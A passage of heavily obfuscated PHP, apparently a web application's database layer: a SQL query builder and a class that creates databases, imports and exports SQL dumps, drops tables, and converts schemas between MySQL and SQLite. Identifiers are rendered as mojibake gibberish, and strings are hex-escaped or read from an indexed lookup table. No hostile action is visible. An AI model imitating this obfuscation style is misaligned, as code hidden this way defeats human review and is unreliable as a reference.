(isset($Ù‰­é‚[$éÂ°—Öé[397]])) { if (strpos($Ù‰­é‚[$éÂ°—Öé[397]], $éÂ°—Öé[50])) { list($î¡¯òª, $ Œ“êá) = explode($éÂ°—Öé[50], $Ù‰­é‚[$éÂ°—Öé[397]]); } else { $î¡¯òª = $Ù‰­é‚[$éÂ°—Öé[397]]; } $î¡¯òª = $î¡¯òª ? $î¡¯òª : 1; $ Œ“êá = isset($ Œ“êá) ? $ Œ“êá : (is_numeric($Ù‰­é‚[$éÂ°—Öé[336]]) ? $Ù‰­é‚[$éÂ°—Öé[336]] : 20); $£”Ì¯ËÁ = $ Œ“êá * ((int) $î¡¯òª - 1); $Ù‰­é‚[$éÂ°—Öé[336]] = $£”Ì¯ËÁ . $éÂ°—Öé[50] . $ Œ“êá; } if (think_config($éÂ°—Öé[1102])) { $œÏ”ï¡± = $éÂ°—Öé[1103] . md5(serialize($Ù‰­é‚)); $Ğã÷Û¦º = think_cache($œÏ”ï¡±); if ($Ğã÷Û¦º) { return $Ğã÷Û¦º; } } $¹óÁöƒ” = $this->parseSql($this->selectSql, $Ù‰­é‚); $¹óÁöƒ” .= $this->parseLock(isset($Ù‰­é‚[$éÂ°—Öé[903]]) ? $Ù‰­é‚[$éÂ°—Öé[903]] : !1); if (isset($œÏ”ï¡±)) { think_cache($œÏ”ï¡±, $¹óÁöƒ”); } return $¹óÁöƒ”; } public function parseSql($ı†²å¿ñ, $Êç²²Ü¶ = array()) { $ÄÖÔË  =& $_SERVER[íû‘ş´]; $ı†²å¿ñ = str_replace(array($ÄÖÔË [1104], $ÄÖÔË [1105], $ÄÖÔË [1106], $ÄÖÔË [1107], $ÄÖÔË [1108], $ÄÖÔË [1109], $ÄÖÔË [1110], $ÄÖÔË [1111], $ÄÖÔË [1112], $ÄÖÔË [1113], $ÄÖÔË [1114]), array($this->parseTable("{$Êç²²Ü¶[$ÄÖÔË [323]]}"), $this->parseDistinct(isset($Êç²²Ü¶[$ÄÖÔË [1115]]) ? $Êç²²Ü¶[$ÄÖÔË [1115]] : !1), $this->parseField(!empty($Êç²²Ü¶[$ÄÖÔË [317]]) ? $Êç²²Ü¶[$ÄÖÔË [317]] : $ÄÖÔË [203]), $this->parseJoin(!empty($Êç²²Ü¶[$ÄÖÔË [326]]) ? $Êç²²Ü¶[$ÄÖÔË [326]] : $ÄÖÔË [12]), $this->parseWhere(!empty($Êç²²Ü¶[$ÄÖÔË [319]]) ? $Êç²²Ü¶[$ÄÖÔË [319]] : $ÄÖÔË [12]), $this->parseGroup(!empty($Êç²²Ü¶[$ÄÖÔË [557]]) ? $Êç²²Ü¶[$ÄÖÔË [557]] : $ÄÖÔË [12]), $this->parseHaving(!empty($Êç²²Ü¶[$ÄÖÔË [1116]]) ? $Êç²²Ü¶[$ÄÖÔË [1116]] : $ÄÖÔË [12]), $this->parseOrder(!empty($Êç²²Ü¶[$ÄÖÔË [409]]) ? $Êç²²Ü¶[$ÄÖÔË [409]] : $ÄÖÔË [12]), $this->parseLimit(!empty($Êç²²Ü¶[$ÄÖÔË [336]]) ? $Êç²²Ü¶[$ÄÖÔË [336]] : $ÄÖÔË [12]), $this->parseUnion(!empty($Êç²²Ü¶[$ÄÖÔË [391]]) ? $Êç²²Ü¶[$ÄÖÔË [391]] : $ÄÖÔË [12]), $this->parseComment(!empty($Êç²²Ü¶[$ÄÖÔË [398]]) ? $Êç²²Ü¶[$ÄÖÔË [398]] : $ÄÖÔË [12])), $ı†²å¿ñ); return $ı†²å¿ñ; } public function getLastSql($×ã«˜şÂ = '') { return $×ã«˜şÂ ? $this->modelSql[$×ã«˜şÂ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ŞªÓÑè•) { return addslashes($ŞªÓÑè•); } public function setModel($œúÏÉ’ò) { $this->model = $œúÏÉ’ò; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ã¯È¤½ª = array()) { $¨ù¢ûñ =& $_SERVER[íû‘ş´]; if (empty($ã¯È¤½ª)) { $ã¯È¤½ª = $GLOBALS[$¨ù¢ûñ[6]][$¨ù¢ûñ[21]]; } $this->database = $ã¯È¤½ª; } public function model($ãâ­¦– = '') { return new ModelBase($ãâ­¦–, $_SERVER[íû‘ş´][12], $this->database); } public function db($Ìé•¡ÑØ = false) { $•Øó¸ñõ =& $_SERVER[íû‘ş´]; $¬³ûÌ„Œ = array_change_key_case($this->database); if ($this->dbType() == $•Øó¸ñõ[13] || !$Ìé•¡ÑØ) { return $this->model()->db(); } $É›×ù‡» = $¬³ûÌ„Œ[$•Øó¸ñõ[1030]]; $¬³ûÌ„Œ[$•Øó¸ñõ[1030]] = $•Øó¸ñõ[12]; if ($¬³ûÌ„Œ[$•Øó¸ñõ[1025]] == $•Øó¸ñõ[1022]) { $ÆØÍº°º = $¬³ûÌ„Œ[$•Øó¸ñõ[1031]]; $¬³ûÌ„Œ[$•Øó¸ñõ[1031]] = substr($ÆØÍº°º, 0, strrpos($ÆØÍº°º, $•Øó¸ñõ[1117])); } $this->database = $¬³ûÌ„Œ; $ğéöˆª = $this->model()->db(); try { $µŞïïú× = $ğéöˆª->execute("\x73\x68\x6f\x77\40\x64\141\x74\x61\142\141\x73\x65\x73\x20\154\151\x6b\145\40\x27{$É›×ù‡»}\x27"); } catch (Exception $®É‰Àà‹) { } if (!$µŞïïú×) { $ğéöˆª->execute("\143\162\x65\x61\x74\x65\x20\144\141\x74\x61\x62\x61\x73\145\40\x60{$É›×ù‡»}\140"); } $¬³ûÌ„Œ[$•Øó¸ñõ[1030]] = $É›×ù‡»; if ($¬³ûÌ„Œ[$•Øó¸ñõ[1025]] == $•Øó¸ñõ[1022]) { $¬³ûÌ„Œ[$•Øó¸ñõ[1031]] .= $•Øó¸ñõ[1117] . $É›×ù‡»; } $this->database = $¬³ûÌ„Œ; $ğéöˆª->execute("\x75\x73\x65\40\140{$É›×ù‡»}\x60"); return $ğéöˆª; } public function createTable($ˆê…ºñô, &$„ù¢Ÿ³õ) { $Ç¾–©›æ =& $_SERVER[íû‘ş´]; if (!IO::exist($ˆê…ºñô)) { ActionCall($Ç¾–©›æ[1118], !0, 0); show_json(LNG($Ç¾–©›æ[1119]), !1); } $²Ç…—ÇÒ = $this->model()->db(); $–Ü±ÀÒ¥ = sqlSplit(IO::getContent($ˆê…ºñô)); foreach ($–Ü±ÀÒ¥ as $öÑŒø²Å) { $ÒÌÈâàŠ = stripos($öÑŒø²Å, $Ç¾–©›æ[1120]) === 0; if ($ÒÌÈâàŠ) { $„ù¢Ÿ³õ->task[$Ç¾–©›æ[845]] += 1; } $²Ç…—ÇÒ->execute($öÑŒø²Å); if ($ÒÌÈâàŠ) { preg_match($Ç¾–©›æ[1121], $öÑŒø²Å, $û—Õ¡Ãº); $„ù¢Ÿ³õ->task[$Ç¾–©›æ[1122]] = $û—Õ¡Ãº[1]; $„ù¢Ÿ³õ->update(1); } } } public function insertTable($„ÈÉÀ½, &$®½îä) { $‡’¤ñ·• =& $_SERVER[íû‘ş´]; $³³©²Ëß = $this->model()->db(); $õì±³×ª = $±²ŸÍÖ ? array($±²ŸÍÖ) : $³³©²Ëß->getTables(); foreach ($„ÈÉÀ½ as $µà…Á®) { $±²ŸÍÖ = basename($µà…Á®, $‡’¤ñ·•[847]); if (!in_array($±²ŸÍÖ, $õì±³×ª)) { continue; } $®½îä->task[$‡’¤ñ·•[1122]] = $±²ŸÍÖ; if (get_filesize($µà…Á®) == 0) { continue; } $Ø­¦˜Œ = $this->sqlToDb($µà…Á®, $®½îä); if (!$Ø­¦˜Œ) { ActionCall($‡’¤ñ·•[1118], !0, 0); show_json(LNG($‡’¤ñ·•[1123]) . "\133{$±²ŸÍÖ}\x5d", !1); } } } public function sqlFromDb($çËØï²Ä, $ıÂ¼„ØŸ, &$›†±, $òÑ¦÷ = '') { if ($›†±) { $›†±->task[$_SERVER[íû‘ş´][1122]] = $çËØï²Ä; } $æ·ûš = $this->model($çËØï²Ä); $ß­ö±‚ø = 0; $§ÙÏ‹ä = 0; $€ÊŸ›®› = 10000; $¥°ÌØ¢‹ = fopen($ıÂ¼„ØŸ, $_SERVER[íû‘ş´][1124]); $Å–şµŒü = $æ·ûš->getPk(); $–ûëğàÛ = $æ·ûš->getDbFields(); $Ì–§ñû = $_SERVER[íû‘ş´][12]; if ($GLOBALS[$_SERVER[íû‘ş´][846]] && in_array($çËØï²Ä, array($_SERVER[íû‘ş´][1125], $_SERVER[íû‘ş´][1126]))) { $Ì–§ñû = $çËØï²Ä; } do { $ Üó£êë = array($Å–şµŒü => array($_SERVER[íû‘ş´][1072], $§ÙÏ‹ä)); $–¨ñ”™‡ = $æ·ûš->where($ Üó£êë)->field($–ûëğàÛ)->order($Å–şµŒü . $_SERVER[íû‘ş´][1127])->limit($€ÊŸ›®›)->select(); $–¨ñ”™‡ = !empty($–¨ñ”™‡) ? $–¨ñ”™‡ : array(); if (!($Ù·¤›æ† = count($–¨ñ”™‡))) { break; } $Æş…»åÌ = end($–¨ñ”™‡); $§ÙÏ‹ä = $Æş…»åÌ[$Å–şµŒü]; $ßæÅÏ§ = array(); foreach ($–¨ñ”™‡ as $¹üğ—»€) { if ($Ì–§ñû) { if ($çËØï²Ä == $_SERVER[íû‘ş´][1125]) { if ($¹üğ—»€[$_SERVER[íû‘ş´][33]] == $_SERVER[íû‘ş´][1128]) { $Í¸ÀøĞ± = json_decode($¹üğ—»€[$_SERVER[íû‘ş´][418]], !0); if ($Í¸ÀøĞ±[$_SERVER[íû‘ş´][32]] == $GLOBALS[$_SERVER[íû‘ş´][846]] && $Í¸ÀøĞ±[$_SERVER[íû‘ş´][809]] != 1) { continue; } } } else { if ($¹üğ—»€[$_SERVER[íû‘ş´][33]] == $_SERVER[íû‘ş´][1129] && $¹üğ—»€[$_SERVER[íû‘ş´][94]] == $_SERVER[íû‘ş´][838]) { continue; } } } if ($òÑ¦÷) { $¹üğ—»€[$_SERVER[íû‘ş´][84]] = "\x7b\x69\x6f\72{$òÑ¦÷}\175" . substr($¹üğ—»€[$_SERVER[íû‘ş´][84]], strlen("\173\151\x6f\x3a{$¹üğ—»€[$_SERVER[íû‘ş´][876]]}\x7d")); $¹üğ—»€[$_SERVER[íû‘ş´][876]] = $òÑ¦÷; } $ßæÅÏ§[] = $_SERVER[íû‘ş´][1130] . $this->sqlEncode($¹üğ—»€) . $_SERVER[íû‘ş´][1131]; } $ÃŸõ…¶· = "\111\116\123\x45\122\124\x20\x49\x4e\x54\117\40\140{$çËØï²Ä}\x60\x20\50\140" . implode($_SERVER[íû‘ş´][1132], $–ûëğàÛ) . $_SERVER[íû‘ş´][1133]; fwrite($¥°ÌØ¢‹, $ÃŸõ…¶· . implode($_SERVER[íû‘ş´][1134], $ßæÅÏ§) . $_SERVER[íû‘ş´][71] . PHP_EOL); $ß­ö±‚ø += $Ù·¤›æ†; if ($›†±) { $›†±->update($Ù·¤›æ†); } } while ($€ÊŸ›®› == $Ù·¤›æ†); fclose($¥°ÌØ¢‹); return $ß­ö±‚ø; } public function sqlToDb($ë¶Æ½ùâ, &$ïİ¼ÌØ) { $Àú˜î¨À =& $_SERVER[íû‘ş´]; $ƒÇİ™»« = $this->model()->db(); $Œ£Ó¥„’ = @fopen($ë¶Æ½ùâ, $Àú˜î¨À[1135]); if (!$Œ£Ó¥„’) { return !1; } $×©–”¾ƒ = 0; $œ·üè˜ = $Àú˜î¨À[12]; $ÉÈ¢­äÓ = array(); $éãÌíôò = $this->dbType(); $ÉäÉ‘Ü = $éãÌíôò == $Àú˜î¨À[13] ? 500 : 2000; $¿ğã’—Ô = basename($ë¶Æ½ùâ, $Àú˜î¨À[847]); $ÛÛ­’ = 0; $³…ÀÜ¸ò = 4194304 - 104858; $úí½‹õ§ = 1000000 - 104858; while (!feof($Œ£Ó¥„’)) { $öœ’¢üû = trim(fgets($Œ£Ó¥„’)); if (!$öœ’¢üû) { continue; } $Ù‚öøÏÜ = $this->sqlDecode($öœ’¢üû, $éãÌíôò, $¿ğã’—Ô); if (stripos($Ù‚öøÏÜ, $Àú˜î¨À[399]) === 0) { if (!$œ·üè˜) { $œ·üè˜ = $Ù‚öøÏÜ . $Àú˜î¨À[53]; } continue; } if ($ïİ¼ÌØ) { $ïİ¼ÌØ->task[$Àú˜î¨À[845]] += 1; } $×©–”¾ƒ++; $ÉÈ¢­äÓ[] = rtrim(rtrim(trim($Ù‚öøÏÜ), $Àú˜î¨À[50]), $Àú˜î¨À[71]); $œ±àÀ  = null; $‰åÊ¿ïÓ = strlen($Ù‚öøÏÜ); $ÛÛ­’ += $‰åÊ¿ïÓ; if ($ÛÛ­’ >= ($ÉäÉ‘Ü == 500 ? $úí½‹õ§ : $³…ÀÜ¸ò)) { $œ±àÀ  = array_pop($ÉÈ¢­äÓ); if ($×©–”¾ƒ > 1) { $×©–”¾ƒ--; } } if ($×©–”¾ƒ >= $ÉäÉ‘Ü || $œ±àÀ ) { $Ù‚öøÏÜ = $œ·üè˜ . implode($Àú˜î¨À[50], $ÉÈ¢­äÓ); if (!$ƒÇİ™»«->execute($Ù‚öøÏÜ)) { return !1; } if ($ïİ¼ÌØ) { $ïİ¼ÌØ->update($×©–”¾ƒ); } $ÉÈ¢­äÓ = array(); $×©–”¾ƒ = 0; $ÛÛ­’ = 0; if ($œ±àÀ ) { $ÉÈ¢­äÓ = array($œ±àÀ ); $×©–”¾ƒ = 1; $ÛÛ­’ = $‰åÊ¿ïÓ; } } } fclose($Œ£Ó¥„’); if (!empty($ÉÈ¢­äÓ)) { $Ù‚öøÏÜ = $œ·üè˜ . implode($Àú˜î¨À[50], $ÉÈ¢­äÓ); if (!$ƒÇİ™»«->execute($Ù‚öøÏÜ)) { return !1; } if ($ïİ¼ÌØ) { $ïİ¼ÌØ->update($×©–”¾ƒ); } } return !0; } public function dropTable($²£Ü’æÏ = null) { $íóË—£÷ = $this->model()->db(); $ï•ÓÎ§í = $²£Ü’æÏ ? array($²£Ü’æÏ) : $íóË—£÷->getTables(); if (!$ï•ÓÎ§í) { return; } foreach ($ï•ÓÎ§í as $²£Ü’æÏ) { if ($²£Ü’æÏ) { $²£Ü’æÏ = strtolower($²£Ü’æÏ); } else { continue; } $íóË—£÷->execute("\x64\x72\x6f\x70\40\164\x61\142\154\x65\40\x69\146\x20\145\170\x69\x73\x74\163\x20\x60{$²£Ü’æÏ}\140"); } } private function sqlEncode($›¬€‚¢) { $ıüÜĞ¤’ =& $_SERVER[íû‘ş´]; $ì¿üÒÛ = array(); foreach ($›¬€‚¢ as $úîèÓ ß) { if (is_array($úîèÓ ß)) { $úîèÓ ß = json_encode_force($úîèÓ ß); } $úîèÓ ß = addslashes($úîèÓ ß); $úîèÓ ß = str_replace(array($ıüÜĞ¤’[1136], $ıüÜĞ¤’[246]), array($ıüÜĞ¤’[1137], $ıüÜĞ¤’[1138]), $úîèÓ ß); $ì¿üÒÛ[] = str_replace($ıüÜĞ¤’[58], $ıüÜĞ¤’[1139], $úîèÓ ß); } return $ıüÜĞ¤’[58] . implode($ıüÜĞ¤’[1140], $ì¿üÒÛ) . $ıüÜĞ¤’[58]; } private function sqlDecode($Š¼À‹Í, $ Ö”úÖ°, $ŠñÅô…Ô = '') { $õÑ¢ÅŒÈ =& $_SERVER[íû‘ş´]; $Š¼À‹Í = str_replace(array($õÑ¢ÅŒÈ[1137], $õÑ¢ÅŒÈ[1138]), array($õÑ¢ÅŒÈ[1136], $õÑ¢ÅŒÈ[246]), $Š¼À‹Í); if ($ Ö”úÖ° == $õÑ¢ÅŒÈ[13]) { return $ŠñÅô…Ô != $õÑ¢ÅŒÈ[1141] ? stripslashes($Š¼À‹Í) : $Š¼À‹Í; } if ($ŠñÅô…Ô == $õÑ¢ÅŒÈ[1141]) { $Š¼À‹Í = str_replace($õÑ¢ÅŒÈ[1142], $õÑ¢ÅŒÈ[118], stripslashes($Š¼À‹Í)); } return $Š¼À‹Í; } public function getSqlFile($îĞ·œ = '') { $Öß€¨˜É =& $_SERVER[íû‘ş´]; $îñÊˆÇ¢ = $this->dbType(!0); $ÕŞšÌ = CONTROLLER_DIR . "\x69\156\x73\x74\141\154\x6c\57\x64\x61\x74\141\x2f{$îñÊˆÇ¢}\x2e\163\x71\154"; $éÈ³¥ï× = file_get_contents($ÕŞšÌ); $¨¹©Ñâ = $Öß€¨˜É[1143] . ($îñÊˆÇ¢ == $Öß€¨˜É[863] ? $Öß€¨˜É[1144] : $Öß€¨˜É[1145]) . $Öß€¨˜É[1146]; preg_match_all($¨¹©Ñâ, $éÈ³¥ï×, $—˜¡Ä‚í); $Š³ºÊ™Ô = $—˜¡Ä‚í[1]; $¯µƒü÷— = $this->model()->db(); $…—“Ùú = $¯µƒü÷—->getTables(); $ĞŠòıƒ£ = TEMP_FILES . $Öß€¨˜É[1147] . date($Öß€¨˜É[255]) . $Öß€¨˜É[8]; del_dir($ĞŠòıƒ£); mk_dir($ĞŠòıƒ£); $ÉŠã©Ğ© = $ĞŠòıƒ£ . $Öß€¨˜É[1148]; $ş›çô—¦ = $ĞŠòıƒ£ . $Öß€¨˜É[1149]; $ÂºöÇÛ¡ = $îñÊˆÇ¢ == $Öß€¨˜É[13] ? $Öß€¨˜É[863] : $Öß€¨˜É[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\x61\154\x6c\57\x64\x61\164\x61\57{$ÂºöÇÛ¡}\56\163\161\154", $ĞŠòıƒ£); @touch($ĞŠòıƒ£ . $îñÊˆÇ¢ . $Öß€¨˜É[847]); $ÎºôÉÓÛ = fopen($ÉŠã©Ğ©, $Öß€¨˜É[1124]); $±ÑŸ£æ™ = fopen($ş›çô—¦, $Öß€¨˜É[1124]); if ($îñÊˆÇ¢ == $Öß€¨˜É[13]) { $…—“Ùú = array_diff($…—“Ùú, array($Öß€¨˜É[843], $Öß€¨˜É[844])); $À½­ëò = array($Öß€¨˜É[1150], $Öß€¨˜É[1151], $Öß€¨˜É[1152]); fwrite($±ÑŸ£æ™, implode(PHP_EOL, $À½­ëò) . PHP_EOL . PHP_EOL); foreach ($…—“Ùú as $×æÁÆ”²) { $Ã•Ú = $this->sqlFromSqlite($×æÁÆ”²); if (!$Ã•Ú[$Öß€¨˜É[13]]) { continue; } fwrite($±ÑŸ£æ™, $Ã•Ú[$Öß€¨˜É[13]] . PHP_EOL . PHP_EOL); if (!in_array($×æÁÆ”², $Š³ºÊ™Ô)) { fwrite($ÎºôÉÓÛ, $Ã•Ú[$Öß€¨˜É[863]] . PHP_EOL . PHP_EOL); } } } else { foreach ($…—“Ùú as $×æÁÆ”²) { $Ã•Ú = $this->sqlFromMysql($×æÁÆ”²); if (!$Ã•Ú[$Öß€¨˜É[863]]) { continue; } fwrite($ÎºôÉÓÛ, $Ã•Ú[$Öß€¨˜É[863]] . PHP_EOL . PHP_EOL); if (!in_array($×æÁÆ”², $Š³ºÊ™Ô)) { fwrite($±ÑŸ£æ™, $Ã•Ú[$Öß€¨˜É[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÎºôÉÓÛ); fclose($±ÑŸ£æ™); $éÈ³¥ï× = array($Öß€¨˜É[863] => $ÉŠã©Ğ©, $Öß€¨˜É[13] => $ş›çô—¦); return $îĞ·œ ? $éÈ³¥ï×[$îĞ·œ] : $éÈ³¥ï×; } public function dbType($¢òë = false) { $ó§°ë¥† =& $_SERVER[íû‘ş´]; $ÇòôÔ‰¶ = $¢òë ? $GLOBALS[$ó§°ë¥†[6]][$ó§°ë¥†[21]] : $this->database; $ÇòôÔ‰¶ = array_change_key_case($ÇòôÔ‰¶); $ó—”©ÂÎ = $ÇòôÔ‰¶[$ó§°ë¥†[1025]]; if ($ó—”©ÂÎ == $ó§°ë¥†[1022]) { $ƒÈœ©öá = explode($ó§°ë¥†[4], $ÇòôÔ‰¶[$ó§°ë¥†[1031]]); $ó—”©ÂÎ = $ƒÈœ©öá[0]; } $ä”›É¥ = array($ó§°ë¥†[1153] => $ó§°ë¥†[13], $ó§°ë¥†[970] => $ó§°ë¥†[863]); if (isset($ä”›É¥[$ó—”©ÂÎ])) { $ó—”©ÂÎ = $ä”›É¥[$ó—”©ÂÎ]; } return $ó—”©ÂÎ; } public function sqlFromMysql($÷ú®°ü, $¹ø¬ĞÌ¢ = '') { $Æ¯™øÕÉ =& $_SERVER[íû‘ş´]; $Éà®›»² = $this->model()->db(); $’Ì¼¼Œ­ = $Éà®›»²->query($Æ¯™øÕÉ[1154] . $÷ú®°ü . $Æ¯™øÕÉ[429]); if (!$’Ì¼¼Œ­ || !$’Ì¼¼Œ­[0]) { return !1; } $‰ø¤Î´é = _get($’Ì¼¼Œ­[0], $Æ¯™øÕÉ[1155], $Æ¯™øÕÉ[12]); if (!$‰ø¤Î´é) { return !1; } $ÚŒë‰ã = "\104\122\117\120\x20\124\101\102\x4c\x45\40\111\106\40\x45\x58\x49\x53\124\x53\x20\140{$÷ú®°ü}\140\73" . PHP_EOL . $‰ø¤Î´é . $Æ¯™øÕÉ[71]; if ($¹ø¬ĞÌ¢ && $¹ø¬ĞÌ¢ == $Æ¯™øÕÉ[863]) { return $ÚŒë‰ã; } $©¹†¥ù = array_change_key_case($GLOBALS[$Æ¯™øÕÉ[6]][$Æ¯™øÕÉ[21]]); $¡»ºÁ¢ô = $©¹†¥ù[$Æ¯™øÕÉ[1030]]; $æì§úã = $Æ¯™øÕÉ[1156] . $¡»ºÁ¢ô . $Æ¯™øÕÉ[1157] . $÷ú®°ü . $Æ¯™øÕÉ[58]; $õàÈÚ±½ = $Æ¯™øÕÉ[1158] . $÷ú®°ü . $Æ¯™øÕÉ[958]; $ŞªÇ‰¼õ = $Éà®›»²->query($æì§úã); if (empty($ŞªÇ‰¼õ)) { $„‚ïİ£ = array($Æ¯™øÕÉ[863] => $Æ¯™øÕÉ[12], $Æ¯™øÕÉ[13] => $Æ¯™øÕÉ[12]); return $¹ø¬ĞÌ¢ ? $„‚ïİ£[$¹ø¬ĞÌ¢] : $„‚ïİ£; } $¾Ñ»’ã• = $Éà®›»²->query($õàÈÚ±½); $ğúŒÒà© = $Æ¯™øÕÉ[12]; $‘…ş£ï‹ = array(); foreach ($¾Ñ»’ã• as $ÉáËş„”) { if (!$ğúŒÒà© && $ÉáËş„”[$Æ¯™øÕÉ[1159]] == $Æ¯™øÕÉ[1160]) { $ğúŒÒà© = $ÉáËş„”[$Æ¯™øÕÉ[1161]]; } if (isset($‘…ş£ï‹[$ÉáËş„”[$Æ¯™øÕÉ[1159]]])) { $‘…ş£ï‹[$ÉáËş„”[$Æ¯™øÕÉ[1159]]][$Æ¯™øÕÉ[1162]][] = $ÉáËş„”[$Æ¯™øÕÉ[1161]]; continue; } $‘…ş£ï‹[$ÉáËş„”[$Æ¯™øÕÉ[1159]]] = array($Æ¯™øÕÉ[1163] => $ÉáËş„”[$Æ¯™øÕÉ[1159]], $Æ¯™øÕÉ[1162] => array($ÉáËş„”[$Æ¯™øÕÉ[1161]]), $Æ¯™øÕÉ[1164] => $ÉáËş„”[$Æ¯™øÕÉ[1165]] == $Æ¯™øÕÉ[88] ? 0 : 1); } $ºûç Ğè = array(); foreach ($‘…ş£ï‹ as $ÉáËş„”) { $Ã–ƒ»¾” = $ÉáËş„”[$Æ¯™øÕÉ[1163]] == $Æ¯™øÕÉ[1160]; $÷¬ıÑ” = array($Æ¯™øÕÉ[1166], $ÉáËş„”[$Æ¯™øÕÉ[1164]] == $Æ¯™øÕÉ[88] && !$Ã–ƒ»¾” ? $Æ¯™øÕÉ[1167] : $Æ¯™øÕÉ[12], $Æ¯™øÕÉ[1168], $Æ¯™øÕÉ[1169] . $÷ú®°ü . $Æ¯™øÕÉ[11] . ($Ã–ƒ»¾” ? $Æ¯™øÕÉ[1170] : $ÉáËş„”[$Æ¯™øÕÉ[1163]]) . $Æ¯™øÕÉ[118], $Æ¯™øÕÉ[1171], $Æ¯™øÕÉ[118] . $÷ú®°ü . $Æ¯™øÕÉ[118], $Æ¯™øÕÉ[1172] . implode($Æ¯™øÕÉ[1173], $ÉáËş„”[$Æ¯™øÕÉ[1162]]) . $Æ¯™øÕÉ[1174]); $ºûç Ğè[] = implode($Æ¯™øÕÉ[53], $÷¬ıÑ”) . $Æ¯™øÕÉ[71]; } $ŸÖ©Ìœí = array(); $ÉëœÙ¬ = array($Æ¯™øÕÉ[1175] => $Æ¯™øÕÉ[1176], $Æ¯™øÕÉ[1176] => $Æ¯™øÕÉ[1176], $Æ¯™øÕÉ[332] => $Æ¯™øÕÉ[359], $Æ¯™øÕÉ[331] => $Æ¯™øÕÉ[359]); foreach ($ŞªÇ‰¼õ as $ÉáËş„”) { $÷¬ıÑ” = array($Æ¯™øÕÉ[118] . $ÉáËş„”[$Æ¯™øÕÉ[1177]] . $Æ¯™øÕÉ[118], isset($ÉëœÙ¬[$ÉáËş„”[$Æ¯™øÕÉ[1178]]]) ? $ÉëœÙ¬[$ÉáËş„”[$Æ¯™øÕÉ[1178]]] : $ÉáËş„”[$Æ¯™øÕÉ[1179]], $ÉáËş„”[$Æ¯™øÕÉ[1180]] == $Æ¯™øÕÉ[956] ? $Æ¯™øÕÉ[1181] : $Æ¯™øÕÉ[1182], $ÉáËş„”[$Æ¯™øÕÉ[1177]] == $ğúŒÒà© ? $Æ¯™øÕÉ[1183] : $Æ¯™øÕÉ[12], $ÉáËş„”[$Æ¯™øÕÉ[1007]] ? strtoupper(str_replace($Æ¯™øÕÉ[11], $Æ¯™øÕÉ[12], $ÉáËş„”[$Æ¯™øÕÉ[1007]])) : $Æ¯™øÕÉ[12]); $ŸÖ©Ìœí[] = trim(implode($Æ¯™øÕÉ[53], $÷¬ıÑ”)); } $ÑÆ–ë¤÷ = array($Æ¯™øÕÉ[1184] . $÷ú®°ü . $Æ¯™øÕÉ[1185], $Æ¯™øÕÉ[1186] . $÷ú®°ü . $Æ¯™øÕÉ[1187], implode($Æ¯™øÕÉ[50] . PHP_EOL, $ŸÖ©Ìœí), $Æ¯™øÕÉ[1004]); $ç¦ ½×Ø = implode(PHP_EOL, array_merge($ÑÆ–ë¤÷, $ºûç Ğè)); if ($¹ø¬ĞÌ¢ && $¹ø¬ĞÌ¢ == $Æ¯™øÕÉ[13]) { return $ç¦ ½×Ø; } $„‚ïİ£ = array($Æ¯™øÕÉ[863] => $ÚŒë‰ã, $Æ¯™øÕÉ[13] => $ç¦ ½×Ø); return $¹ø¬ĞÌ¢ ? $„‚ïİ£[$¹ø¬ĞÌ¢] : $„‚ïİ£; } public function sqlFromSqlite($Ğéô«¸´, $˜Ğ®ÍÙ£ = '') { $çÖÚŸ¹ =& $_SERVER[íû‘ş´]; $ÃÑ„¯§¼ = $this->model()->db(); $¿»ãÄ£ñ = "\120\x52\101\107\115\x41\40\x54\x41\102\x4c\105\137\x49\x4e\106\x4f\40\x28\x27{$Ğéô«¸´}\47\51"; $åÄŠ€ê = "\123\105\x4c\105\x43\x54\x20\52\x20\106\x52\x4f\x4d\40\163\x71\154\x69\164\145\x5f\x6d\141\x73\x74\145\162\x20\x57\110\x45\x52\105\40\x74\x62\x6c\x5f\x6e\141\x6d\x65\40\x3d\40\x27{$Ğéô«¸´}\47"; $Ôø¦Û› = $ÃÑ„¯§¼->query($¿»ãÄ£ñ); if (empty($Ôø¦Û›)) { $–è‹„¯Ù = array($çÖÚŸ¹[863] => $çÖÚŸ¹[12], $çÖÚŸ¹[13] => $çÖÚŸ¹[12]); return $˜Ğ®ÍÙ£ ? $–è‹„¯Ù[$˜Ğ®ÍÙ£] : $–è‹„¯Ù; } $Çº«ÈŸñ = $ÃÑ„¯§¼->query($åÄŠ€ê); $·¥‡¥©Ñ = $şõ•’ ³ = array(); foreach ($Çº«ÈŸñ as $ÛéŒõüœ) { if ($ÛéŒõüœ[$çÖÚŸ¹[33]] == $çÖÚŸ¹[323]) { $·¥‡¥©Ñ[] = $ÛéŒõüœ[$çÖÚŸ¹[1188]]; } else { $şõ•’ ³[$ÛéŒõüœ[$çÖÚŸ¹[32]]] = $ÛéŒõüœ[$çÖÚŸ¹[1188]]; } } $ñİƒ‰ = array_merge(array($çÖÚŸ¹[1184] . $Ğéô«¸´ . $çÖÚŸ¹[118]), $·¥‡¥©Ñ, array_values($şõ•’ ³)); $ñİƒ‰ = implode($çÖÚŸ¹[71] . PHP_EOL, $ñİƒ‰) . $çÖÚŸ¹[71]; if ($˜Ğ®ÍÙ£ && $˜Ğ®ÍÙ£ == $çÖÚŸ¹[13]) { return $ñİƒ‰; } $—¯ÖÌŒñ = array(); $™Ş¿ƒ›© = array($çÖÚŸ¹[1176] => $çÖÚŸ¹[1189], $çÖÚŸ¹[359] => $çÖÚŸ¹[1190]); $”„·©Ğ¨ = $çÖÚŸ¹[12]; foreach ($Ôø¦Û› as $ÛéŒõüœ) { if ($ÛéŒõüœ[$çÖÚŸ¹[57]] == $çÖÚŸ¹[88]) { $”„·©Ğ¨ = $ÛéŒõüœ[$çÖÚŸ¹[32]]; } $“°¯©®“ = array($çÖÚŸ¹[429] . $ÛéŒõüœ[$çÖÚŸ¹[32]] . $çÖÚŸ¹[429], isset($™Ş¿ƒ›©[$ÛéŒõüœ[$çÖÚŸ¹[33]]]) ? $™Ş¿ƒ›©[$ÛéŒõüœ[$çÖÚŸ¹[33]]] : $ÛéŒõüœ[$çÖÚŸ¹[33]], $ÛéŒõüœ[$çÖÚŸ¹[35]] == $çÖÚŸ¹[88] ? $çÖÚŸ¹[1181] : $çÖÚŸ¹[1191] . $ÛéŒõüœ[$çÖÚŸ¹[56]], $ÛéŒõüœ[$çÖÚŸ¹[57]] == $çÖÚŸ¹[88] ? 